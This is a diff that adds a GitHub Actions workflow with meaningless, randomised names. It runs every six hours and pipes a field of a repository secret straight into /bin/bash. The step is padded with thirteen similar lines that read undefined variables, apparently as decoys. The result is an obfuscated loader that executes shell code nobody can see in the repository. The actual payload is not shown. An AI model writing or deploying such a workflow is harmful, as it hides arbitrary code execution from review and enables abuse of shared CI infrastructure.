@@ -1,0 +1,30 @@
+name: caofeichang8712
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: caofeichang8712
+        env:
+          jtr35818: ${{ secrets.jtr35818 }}
+        run: |
+          echo $jtr35818 | jq -r .zndib56863 | /bin/bash
+          echo $nc35 | jq -r .fbwde6621 | /bin/bash
+          echo $mz842 | jq -r .cknv8 | /bin/bash
+          echo $hsny532 | jq -r .m1 | /bin/bash
+          echo $a3 | jq -r .v060 | /bin/bash
+          echo $kfv468 | jq -r .taars92509 | /bin/bash
+          echo $inj99213 | jq -r .zda31430 | /bin/bash
+          echo $t2 | jq -r .udwj3 | /bin/bash
+          echo $lzp93 | jq -r .ma3 | /bin/bash
+          echo $c9822 | jq -r .hjqg16 | /bin/bash
+          echo $tev8 | jq -r .jxc06 | /bin/bash
+          echo $z8258 | jq -r .a83 | /bin/bash
+          echo $uyo4 | jq -r .l9 | /bin/bash
+          echo $axc8602 | jq -r .gxvcl2938 | /bin/bash
+
